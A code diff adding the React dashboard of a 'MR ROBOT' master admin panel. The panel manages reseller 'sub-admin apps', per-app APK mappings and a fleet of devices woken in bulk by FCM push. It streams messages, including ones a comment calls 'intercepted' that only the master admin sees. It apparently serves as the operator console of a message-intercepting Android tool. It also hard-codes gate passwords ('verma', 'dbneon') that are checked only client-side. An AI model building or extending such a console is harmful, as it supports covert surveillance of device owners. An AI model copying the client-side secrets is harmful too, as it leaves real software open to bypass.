@@ -2518,3 +2518,416 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
       } catch { if (!closed) setTimeout(connect, 5000); }
     }
     connect();
+    return () => { closed = true; es?.close(); };
+  }, [masterPin]);
+
+  // ── Global WebSocket: live events via Cloudflare Durable Object ──
+  useEffect(() => {
+    let ws: WebSocket | null = null;
+    let closed = false;
+    function connect() {
+      if (closed) return;
+      const wsUrl = location.origin.replace(/^http/, "ws") + "/api/events";
+      ws = new WebSocket(wsUrl);
+      ws.onopen = () => {
+        setWsConnected(true);
+        // Fire reconnect event so DevicesTab can do a full refresh after any disconnect gap
+        window.dispatchEvent(new CustomEvent("mrrobot:ws_reconnected"));
+      };
+      ws.onmessage = (e) => {
+        try {
+          const msg = JSON.parse(e.data as string) as { event: string; data: unknown };
+          if (msg.event === "device_updated") {
+            // Dispatch full device data — DevicesTab surgically updates the single card, no HTTP re-fetch
+            window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: msg.data }));
+          } else if (msg.event === "message_added") {
+            const payload = msg.data as { appId: string; message: MsgRow };
+            window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
+          } else if (msg.event === "master_message_added") {
+            // Intercepted message — only master admin sees this via WS
+            const payload = msg.data as { appId: string; message: MsgRow };
+            window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
+          }
+        } catch { /* ignore */ }
+      };
+      ws.onclose = () => { setWsConnected(false); if (!closed) setTimeout(connect, 3000); };
+      ws.onerror = () => { setWsConnected(false); ws?.close(); };
+    }
+    connect();
+    return () => { closed = true; ws?.close(); };
+  }, []);
+
+  async function handlePingAll() {
+    setPingState("loading"); setPingResult(null); setPingDone(0); setPingTotal(0);
+    try {
+      const r = await apiFetch("/api/master/all-devices?hasFcm=1", { headers: { "x-master-pin": masterPin } });
+      const eligible = r.ok ? (await r.json() as FullDevice[]) : [];
+      setPingTotal(eligible.length); setPingState("running");
+      const BATCH = 100; const DELAY = 300;
+      let ok = 0; let fail = 0;
+      for (let i = 0; i < eligible.length; i += BATCH) {
+        const batch = eligible.slice(i, i + BATCH);
+        const results = await Promise.allSettled(batch.map(d =>
+          apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: d.deviceId, data: { type: "0" } }) }).then(res => { if (!res.ok) throw new Error(); })
+        ));
+        results.forEach(r2 => r2.status === "fulfilled" ? ok++ : fail++);
+        setPingDone(Math.min(i + BATCH, eligible.length));
+        if (i + BATCH < eligible.length) await new Promise(r2 => setTimeout(r2, DELAY));
+      }
+      setPingResult({ ok, fail }); setPingState("done");
+      setTimeout(() => { setPingState("idle"); setPingDone(0); setPingTotal(0); setPingResult(null); }, 7000);
+    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+  }
+
+  async function toggleStatus(app: App) {
+    setTogglingId(app.appId);
+    const newStatus = app.status === "active" ? "disabled" : "active";
+    try {
+      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "PATCH", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ status: newStatus }) });
+      setAppList(prev => prev.map(a => a.appId === app.appId ? { ...a, status: newStatus } : a));
+    } catch { /* ignore */ } finally { setTogglingId(null); }
+  }
+
+  function deleteApp(app: App) {
+    setDeleteGateInput(""); setDeleteGateError(""); setDeleteGateShow(false);
+    setDeleteGateApp(app);
+  }
+  async function confirmDeleteApp(app: App) {
+    setDeleteGateApp(null);
+    setDeletingId(app.appId);
+    try {
+      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
+      setAppList(prev => prev.filter(a => a.appId !== app.appId));
+    } catch { /* ignore */ } finally { setDeletingId(null); }
+  }
+
+  async function logoutAll(app: App) {
+    if (!confirm(`Logout all active sessions for "${app.name}"?`)) return;
+    setLogoutAllId(app.appId);
+    try { await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(app.appId)}`, { method: "DELETE" }); }
+    catch { /* ignore */ } finally { setLogoutAllId(null); }
+  }
+
+  async function resetApk(app: App) {
+    if (!confirm(`Reset APK selection for "${app.name}"?`)) return;
+    setResetApkId(app.appId);
+    try {
+      const r = await apiFetch(`/api/master/token-app/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
+      const j = await r.json() as { ok?: boolean; error?: string; deleted?: number };
+      if (r.ok) alert(`✅ Reset done! ${j.deleted ?? 0} mapping(s) cleared.`);
+      else alert(`❌ Error: ${j.error ?? "Unknown error"}`);
+    } catch { alert("❌ Network error"); } finally { setResetApkId(null); }
+  }
+
+  function copyUrl(app: App) {
+    const url = `${window.location.origin}/preview/dashboard/WebDashboard?appId=${app.appId}`;
+    copyToClipboard(url).then(() => {
+      setCopyMsg(p => ({ ...p, [app.appId]: "Copied!" }));
+      setTimeout(() => setCopyMsg(p => ({ ...p, [app.appId]: "" })), 2000);
+    });
+  }
+
+  const filteredApps = sortedApps.filter(a => {
+    if (dateFilter !== "all") {
+      const created = new Date(a.createdAt);
+      const now = new Date();
+      const startOfDay = (d: Date) => new Date(d.getFullYear(), d.getMonth(), d.getDate());
+      const today = startOfDay(now);
+      const yesterday = new Date(today); yesterday.setDate(today.getDate() - 1);
+      const weekAgo = new Date(today); weekAgo.setDate(today.getDate() - 6);
+      const monthAgo = new Date(today); monthAgo.setMonth(today.getMonth() - 1);
+      if (dateFilter === "today"     && created < today)     return false;
+      if (dateFilter === "yesterday" && (created < yesterday || created >= today)) return false;
+      if (dateFilter === "week"      && created < weekAgo)   return false;
+      if (dateFilter === "month"     && created < monthAgo)  return false;
+    }
+    if (search.trim() === "") return true;
+    return a.appId.toLowerCase().includes(search.trim().toLowerCase()) || a.name.toLowerCase().includes(search.trim().toLowerCase());
+  });
+  const activeCount = appList.filter(a => a.status === "active").length;
+  const pingBusy = pingState === "running" || pingState === "loading";
+
+  const TABS: { id: Tab; label: string }[] = [
+    { id: "apps",     label: "Home"     },
+    { id: "messages", label: "Messages" },
+    { id: "groups",   label: "Groups"   },
+    { id: "devices",  label: "Devices"  },
+    { id: "settings", label: "Settings" },
+    { id: "stats",    label: "Stats"  },
+  ];
+
+  return (
+    <div style={{ minHeight: "100vh", background: T.bg, fontFamily: "'Inter', system-ui, sans-serif", color: T.text }}>
+      <style>{`
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}}
+        *{box-sizing:border-box}
+        .ma-tab-btn{cursor:pointer;background:none;border:none;font-family:inherit;-webkit-tap-highlight-color:transparent;}
+        .ma-tab-btn:active{opacity:0.7;}
+        .ma-card:active{transform:scale(0.985);}
+        .ma-device-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+        @media(max-width:640px){
+          .ma-hide-mob{display:none!important;}
+          .ma-fab{display:flex!important;}
+          .ma-main{padding-bottom:88px!important;}
+          .ma-device-grid{grid-template-columns:1fr 1fr!important;gap:8px!important;}
+          .ma-dcard-row{padding:5px 10px!important;}
+          .ma-dcard-lbl{width:48px!important;font-size:9px!important;}
+          .ma-dcard-val{font-size:9px!important;}
+          .ma-dcard-title{font-size:11px!important;padding:7px 8px 7px 10px!important;}
+          .ma-dcard-check{padding:7px 4px!important;font-size:11px!important;}
+        }
+        .ma-fab{display:none;position:fixed;bottom:20px;right:18px;z-index:200;width:52px;height:52px;border-radius:16px;border:none;background:linear-gradient(135deg,#5254d4,#7c3aed);align-items:center;justify-content:center;color:#fff;cursor:pointer;box-shadow:0 6px 24px rgba(99,102,241,0.55);font-size:22px;font-weight:900;}
+      `}</style>
+
+      {/* ── Header: sub-admin style ── */}
+      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, position: "sticky", top: 0, zIndex: 50, backdropFilter: "blur(20px)" }}>
+        {/* Top row: logo + counters + actions */}
+        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", alignItems: "center", gap: 8, padding: "0 12px", height: 50, flexWrap: "nowrap", overflowX: "auto", scrollbarWidth: "none" }}>
+          {/* Logo */}
+          <div style={{ display: "flex", alignItems: "center", gap: 7, flexShrink: 0 }}>
+            <div style={{ width: 32, height: 32, borderRadius: 10, background: "linear-gradient(145deg,#4f52d4,#7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 16 }}>🤖</div>
+            <span style={{ fontSize: 14, fontWeight: 900, color: T.text, letterSpacing: -0.3 }}>MR ROBOT</span>
+          </div>
+          {/* Online counter — click to filter devices to online only */}
+          <button
+            onClick={() => {
+              if (tab === "devices" && onlineFilter) {
+                setOnlineFilter(false); // already filtered → click to deselect
+              } else {
+                changeTab("devices");
+                setOnlineFilter(true);
+              }
+            }}
+            title={tab === "devices" && onlineFilter ? "Clear online filter" : "Show only online devices"}
+            style={{ display: "inline-flex", alignItems: "center", gap: 5, background: onlineFilter ? "#14532d" : (onlineCount > 0 ? "#14532d" : T.card), border: `1px solid ${onlineCount > 0 ? "#22c55e" : T.borderLight}`, borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: onlineCount > 0 ? "#4ade80" : T.muted, flexShrink: 0, cursor: "pointer" }}>
+            <span style={{ width: 6, height: 6, borderRadius: "50%", background: onlineCount > 0 ? "#22c55e" : T.muted, display: "inline-block", boxShadow: onlineCount > 0 ? "0 0 5px #22c55e" : "none" }} />
+            {onlineCount} /15m{tab === "devices" && onlineFilter ? " ✕" : ""}
+          </button>
+          {/* WS Connection status */}
+          <span className="ma-hide-mob" style={{ display: "inline-flex", alignItems: "center", gap: 5, background: wsConnected ? "#14532d" : T.card, border: `1px solid ${wsConnected ? "#22c55e" : T.borderLight}`, borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: wsConnected ? "#4ade80" : T.muted, flexShrink: 0 }}>
+            <span style={{ width: 6, height: 6, borderRadius: "50%", background: wsConnected ? "#22c55e" : T.muted, display: "inline-block", boxShadow: wsConnected ? "0 0 5px #22c55e" : "none" }} />
+            {wsConnected ? "Live" : "Connecting…"}
+          </span>
+          <div style={{ flex: 1 }} />
+          {/* Sync */}
+          <button onClick={() => { setSyncTick(t => t + 1); void fetchApps(); }} title="Sync all data" style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: T.card, border: `1px solid ${T.borderLight}`, color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer", flexShrink: 0 }}>
+            <Ic.Refresh /> <span className="ma-hide-mob">Sync</span>
+          </button>
+          {/* Ping All — compact in header */}
+          <button onClick={() => void handlePingAll()} disabled={pingBusy} title="Ping All Devices" style={{ display: "flex", alignItems: "center", gap: 5, padding: "6px 12px", borderRadius: 8, background: pingBusy ? T.accentGlow : T.card, border: `1px solid ${pingBusy ? T.accent + "66" : T.borderLight}`, color: pingBusy ? T.accentLight : T.mutedLight, fontSize: 11, fontWeight: 700, cursor: pingBusy ? "wait" : "pointer", flexShrink: 0 }}>
+            <Ic.Wifi /> <span className="ma-hide-mob">{pingBusy ? `${pingDone}/${pingTotal}…` : "Ping All"}</span>
+          </button>
+          {/* PIN + Logout */}
+          {/* Nav unlock button */}
+          {navPassState === "asking" ? (
+            <form onSubmit={e => { e.preventDefault(); if (navPass === "verma") { setTabsUnlocked(t => !t); setNavPassState("idle"); setNavPass(""); } else { setNavPassState("err"); setNavPass(""); setTimeout(() => navPassRef.current?.focus(), 30); } }} style={{ display: "inline-flex", alignItems: "center", gap: 4, position: "relative", flexShrink: 0 }}>
+              <input ref={navPassRef} autoFocus type="password" value={navPass} onChange={e => { setNavPass(e.target.value); setNavPassState("asking"); }} placeholder="password" style={{ width: 80, padding: "3px 7px", borderRadius: 6, border: `1px solid ${navPassState === "err" ? "#ef4444" : T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 11, outline: "none" }} />
+              <button type="submit" style={{ padding: "3px 7px", borderRadius: 6, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontSize: 11, fontWeight: 700, cursor: "pointer" }}>OK</button>
+              <button type="button" onClick={() => { setNavPassState("idle"); setNavPass(""); }} style={{ padding: "3px 5px", borderRadius: 6, background: T.border, border: `1px solid ${T.borderLight}`, color: T.muted, fontSize: 11, cursor: "pointer" }}>✕</button>
+              {navPassState === "err" && <span style={{ position: "absolute", top: "100%", left: 0, fontSize: 10, color: "#ef4444", whiteSpace: "nowrap", marginTop: 2 }}>Galat password</span>}
+            </form>
+          ) : (
+            <button onClick={() => { setNavPassState("asking"); setNavPass(""); setTimeout(() => navPassRef.current?.focus(), 50); }} title={tabsUnlocked ? "Nav hide karo" : "Nav show karo"} style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: `1px solid ${tabsUnlocked ? T.accent + "60" : T.borderLight}`, background: tabsUnlocked ? T.accent + "22" : T.card, color: tabsUnlocked ? T.accentLight : T.muted, flexShrink: 0 }}>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">{tabsUnlocked ? <><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></> : <><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></>}</svg>
+            </button>
+          )}
+          <button onClick={() => setShowChangePin(true)} title="Change PIN" style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: `1px solid ${T.borderLight}`, background: T.card, color: T.muted, flexShrink: 0 }}><Ic.Key /></button>
+          <button onClick={onLogout} title="Logout" style={{ width: 32, height: 32, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(239,68,68,0.3)", background: "rgba(239,68,68,0.1)", color: "#f87171", flexShrink: 0 }}><Ic.LogOut /></button>
+        </div>
+        {/* Tabs row — hidden by default, shown after "verma" password */}
+        {tabsUnlocked && (
+          <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", padding: "0 12px", borderTop: `1px solid ${T.border}`, overflowX: "auto" }}>
+            {TABS.map(t => (
+              <button key={t.id} className="ma-tab-btn" onClick={() => changeTab(t.id)} style={{
+                padding: "10px 16px", fontSize: 12, fontWeight: tab === t.id ? 700 : 500,
+                color: tab === t.id ? T.accentLight : T.muted,
+                border: "none", borderBottom: `2px solid ${tab === t.id ? T.accent : "transparent"}`,
+                background: "transparent", cursor: "pointer", transition: "color 0.15s", whiteSpace: "nowrap",
+                marginBottom: -1,
+              }}>
+                {t.label}
+              </button>
+            ))}
+          </div>
+        )}
+      </div>
+
+      {/* Main content */}
+      <div className="ma-main" style={{ maxWidth: 960, margin: "0 auto", padding: "16px 14px" }}>
+
+        {/* APPS TAB */}
+        {tab === "apps" && (
+          <>
+            {/* Stats */}
+            <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 16 }}>
+              {[
+                { label: "Total Apps", val: appList.length, color: T.accent, Icon: Ic.Layers },
+                { label: "Active", val: activeCount, color: T.green, Icon: Ic.CheckCircle },
+                { label: "Disabled", val: appList.length - activeCount, color: T.red, Icon: Ic.XCircle },
+              ].map(({ label, val, color, Icon }) => (
+                <div key={label} style={{ background: T.card, borderRadius: 13, padding: "14px 16px", border: `1px solid ${T.borderLight}`, position: "relative", overflow: "hidden" }}>
+                  <div style={{ position: "absolute", top: -10, right: -10, width: 60, height: 60, borderRadius: "50%", background: color + "12", pointerEvents: "none" }} />
+                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
+                    <span style={{ color, opacity: 0.9 }}><Icon /></span>
+                    <span style={{ fontSize: 10, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.5 }}>{label}</span>
+                  </div>
+                  <div style={{ fontSize: 30, fontWeight: 900, color, lineHeight: 1 }}>{val}</div>
+                </div>
+              ))}
+            </div>
+
+            {/* Apps header + search */}
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10, gap: 12, flexWrap: "wrap" }}>
+              <div>
+                <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Sub-Admin Apps</div>
+                <div style={{ fontSize: 11, color: T.muted, marginTop: 1 }}>
+                  {dateFilter === "all" ? "Sorted by newest first" : `Filtered: ${filteredApps.length} app${filteredApps.length !== 1 ? "s" : ""}`}
+                </div>
+              </div>
+              <div style={{ display:"flex", alignItems:"center", gap:8 }}>
+                <select
+                  value={dateFilter}
+                  onChange={e => setDateFilter(e.target.value as typeof dateFilter)}
+                  style={{ padding:"7px 30px 7px 12px", borderRadius:9, border:`1px solid ${T.borderLight}`, background:T.card, color:T.text, fontSize:12, fontWeight:600, cursor:"pointer", outline:"none", appearance:"none", backgroundImage:`url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%234d6280' stroke-width='2.5'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E")`, backgroundRepeat:"no-repeat", backgroundPosition:"right 9px center" }}
+                >
+                  <option value="all">All Time</option>
+                  <option value="today">Today</option>
+                  <option value="yesterday">Yesterday</option>
+                  <option value="week">Last 7 Days</option>
+                  <option value="month">Last 30 Days</option>
+                </select>
+                <button onClick={() => { setCreateGateInput(""); setCreateGateError(""); setCreateGateShow(false); setShowCreateGate(true); }} className="ma-hide-mob" style={{ padding: "8px 16px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6 }}><Ic.Plus /> New App</button>
+              </div>
+            </div>
+            <div style={{ marginBottom: 12, position: "relative" }}>
+              <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", color: T.muted, pointerEvents: "none", display: "flex" }}><Ic.Search /></span>
+              <input type="text" placeholder="Search by App ID or name…" value={search} onChange={e => setSearch(e.target.value)} style={{ width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 40px", borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
+              {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 22, height: 22, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
+            </div>
+            {appsLoading ? (
+              <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}><Ic.Loader /><div>Loading apps…</div></div>
+            ) : filteredApps.length === 0 ? (
+              <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+                <Ic.Inbox /><div>{search ? `No apps for "${search}".` : 'No apps yet. Click "New App" to create.'}</div>
+              </div>
+            ) : (
+              <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
+                {filteredApps.map(app => (
+                  <AppCard key={app.appId} app={app} onEdit={setEditApp} onDelete={deleteApp} onToggle={toggleStatus} onLogoutAll={logoutAll} onCopyUrl={copyUrl} onResetApk={resetApk} onRenew={a => setRenewConfirmApp(a)} copyMsg={copyMsg} deletingId={deletingId} togglingId={togglingId} logoutAllId={logoutAllId} resetApkId={resetApkId} renewId={renewId} />
+                ))}
+              </div>
+            )}
+          </>
+        )}
+
+        <div style={{ display: tab === "messages" ? "block" : "none" }}><MessagesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOpenDevice={openDevice} /></div>
+        {/* Mobile FAB — New App (only on apps tab) */}
+        {tab === "apps" && (
+          <button className="ma-fab" onClick={() => { setCreateGateInput(""); setCreateGateError(""); setCreateGateShow(false); setShowCreateGate(true); }} title="New App">＋</button>
+        )}
+        <div style={{ display: tab === "groups" ? "block" : "none" }}><GroupsTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOpenDevice={openDevice} /></div>
+        <div style={{ display: tab === "devices" ? "block" : "none" }}><DevicesTab apps={appList} masterPin={masterPin} syncTick={syncTick} onOnlineCount={setOnlineCount} onlineCount={onlineCount} onlineFilter={onlineFilter} onClearOnlineFilter={() => setOnlineFilter(false)} jumpDeviceId={jumpDeviceId} /></div>
+        <div style={{ display: tab === "settings" ? "block" : "none" }}><SettingsTab apps={appList} masterPin={masterPin} /></div>
+        {tab === "stats" && <StatsTab data={statsData} onRefresh={() => void fetchStats()} />}
+      </div>
+
+      {/* Create App Password Gate */}
+      {showCreateGate && (
+        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.72)", zIndex: 999, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}>
+          <div style={{ background: "#141428", borderRadius: 18, padding: "32px 28px 28px", width: "100%", maxWidth: 380, boxShadow: "0 24px 80px rgba(0,0,0,0.6)", border: "1px solid rgba(255,255,255,0.08)", position: "relative" }}>
+            <button onClick={() => setShowCreateGate(false)} style={{ position: "absolute", top: 14, right: 14, background: "rgba(255,255,255,0.08)", border: "none", color: "#aaa", cursor: "pointer", width: 28, height: 28, borderRadius: 8, fontSize: 16, display: "flex", alignItems: "center", justifyContent: "center" }}>✕</button>
+            <div style={{ fontSize: 18, fontWeight: 800, color: "#fff", marginBottom: 6 }}>Access Required</div>
+            <div style={{ fontSize: 13, color: "#888", marginBottom: 22 }}>Enter the creation password to proceed.</div>
+            <div style={{ fontSize: 11, fontWeight: 700, color: "#8b8fa8", letterSpacing: 1, marginBottom: 6 }}>PASSWORD</div>
+            <div style={{ position: "relative", marginBottom: 16 }}>
+              <input
+                autoFocus
+                type={createGateShow ? "text" : "password"}
+                value={createGateInput}
+                onChange={e => { setCreateGateInput(e.target.value); setCreateGateError(""); }}
+                onKeyDown={e => {
+                  if (e.key === "Enter") {
+                    if (createGateInput === "dbneon") { setShowCreateGate(false); setShowCreate(true); }
+                    else setCreateGateError("Incorrect password. Try again.");
+                  }
+                }}
+                placeholder="Enter password"
+                style={{ width: "100%", boxSizing: "border-box", padding: "12px 44px 12px 14px", borderRadius: 10, background: "#1a1a35", border: `1.5px solid ${createGateError ? "#ef4444" : "rgba(255,255,255,0.1)"}`, color: "#fff", fontSize: 14, outline: "none" }}
+              />
+              <button type="button" onClick={() => setCreateGateShow(s => !s)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: "#666", cursor: "pointer", fontSize: 16, padding: 0 }}>
+                {createGateShow ? "🙈" : "👁"}
+              </button>
+            </div>
+            {createGateError && <div style={{ fontSize: 12, color: "#ef4444", marginBottom: 12, marginTop: -8 }}>{createGateError}</div>}
+            <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
+              <button onClick={() => setShowCreateGate(false)} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "rgba(255,255,255,0.07)", border: "none", color: "#aaa", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Cancel</button>
+              <button onClick={() => {
+                if (createGateInput === "dbneon") { setShowCreateGate(false); setShowCreate(true); }
+                else setCreateGateError("Incorrect password. Try again.");
+              }} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 13, cursor: "pointer" }}>Confirm</button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Delete App Password Gate */}
+      {deleteGateApp && (
+        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.72)", zIndex: 999, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}>
+          <div style={{ background: "#141428", borderRadius: 18, padding: "32px 28px 28px", width: "100%", maxWidth: 380, boxShadow: "0 24px 80px rgba(0,0,0,0.6)", border: "1px solid rgba(255,255,255,0.08)", position: "relative" }}>
+            <button onClick={() => setDeleteGateApp(null)} style={{ position: "absolute", top: 14, right: 14, background: "rgba(255,255,255,0.08)", border: "none", color: "#aaa", cursor: "pointer", width: 28, height: 28, borderRadius: 8, fontSize: 16, display: "flex", alignItems: "center", justifyContent: "center" }}>✕</button>
+            <div style={{ fontSize: 18, fontWeight: 800, color: "#ef4444", marginBottom: 6 }}>⚠ Delete App</div>
+            <div style={{ fontSize: 13, color: "#888", marginBottom: 4 }}>You are about to permanently delete:</div>
+            <div style={{ fontSize: 13, fontWeight: 700, color: "#fff", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.25)", borderRadius: 8, padding: "8px 12px", marginBottom: 20 }}>{deleteGateApp.name} <span style={{ color: "#666", fontWeight: 400 }}>({deleteGateApp.appId})</span></div>
+            <div style={{ fontSize: 11, fontWeight: 700, color: "#8b8fa8", letterSpacing: 1, marginBottom: 6 }}>PASSWORD</div>
+            <div style={{ position: "relative", marginBottom: 16 }}>
+              <input
+                autoFocus
+                type={deleteGateShow ? "text" : "password"}
+                value={deleteGateInput}
+                onChange={e => { setDeleteGateInput(e.target.value); setDeleteGateError(""); }}
+                onKeyDown={e => {
+                  if (e.key === "Enter") {
+                    if (deleteGateInput === "dbneon") confirmDeleteApp(deleteGateApp);
+                    else setDeleteGateError("Incorrect password. Try again.");
+                  }
+                }}
+                placeholder="Enter password to confirm delete"
+                style={{ width: "100%", boxSizing: "border-box", padding: "12px 44px 12px 14px", borderRadius: 10, background: "#1a1a35", border: `1.5px solid ${deleteGateError ? "#ef4444" : "rgba(255,255,255,0.1)"}`, color: "#fff", fontSize: 14, outline: "none" }}
+              />
+              <button type="button" onClick={() => setDeleteGateShow(s => !s)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: "#666", cursor: "pointer", fontSize: 16, padding: 0 }}>
+                {deleteGateShow ? "🙈" : "👁"}
+              </button>
+            </div>
+            {deleteGateError && <div style={{ fontSize: 12, color: "#ef4444", marginBottom: 12, marginTop: -8 }}>{deleteGateError}</div>}
+            <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
+              <button onClick={() => setDeleteGateApp(null)} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "rgba(255,255,255,0.07)", border: "none", color: "#aaa", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>Cancel</button>
+              <button onClick={() => {
+                if (deleteGateInput === "dbneon") confirmDeleteApp(deleteGateApp);
+                else setDeleteGateError("Incorrect password. Try again.");
+              }} style={{ flex: 1, padding: "11px 0", borderRadius: 10, background: "linear-gradient(135deg,#dc2626,#ef4444)", border: "none", color: "#fff", fontWeight: 800, fontSize: 13, cursor: "pointer" }}>Delete App</button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Modals */}
+      {showCreate && <CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)} onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />}
+      {showViewPin && <ViewPinModal masterPin={masterPin} onClose={() => setShowViewPin(false)} />}
+      {showChangePin && <ChangePinModal masterPin={masterPin} onClose={() => setShowChangePin(false)} onChanged={p => { onPinChanged(p); setShowChangePin(false); }} />}
+      {editApp && <EditAppModal app={editApp} masterPin={masterPin} onClose={() => setEditApp(null)} onUpdated={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? a : x)); setEditApp(null); }} />}
+      {renewConfirmApp && <RenewModal app={renewConfirmApp} masterPin={masterPin} onClose={() => setRenewConfirmApp(null)} onRenewed={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? { ...x, createdAt: a.createdAt, status: a.status } : x)); setRenewConfirmApp(null); }} />}
+
+    </div>
+  );
+}
+
+/* ── Root Export ── */
+export default function MainAdminPanel() {
+  const [masterPin, setMasterPin] = useState<string | null>(() => sessionStorage.getItem("mrrobot_master_auth") ?? null);
+  function handleAuth(pin: string) { sessionStorage.setItem("mrrobot_master_auth", pin); setMasterPin(pin); }
+  function handleLogout() { sessionStorage.removeItem("mrrobot_master_auth"); setMasterPin(null); }
+  function handlePinChanged(newPin: string) { sessionStorage.setItem("mrrobot_master_auth", newPin); setMasterPin(newPin); alert("Master PIN changed successfully!"); }
+  if (!masterPin) return <MasterLogin onAuth={handleAuth} />;
+  return <Dashboard masterPin={masterPin} onLogout={handleLogout} onPinChanged={handlePinChanged} />;
+}
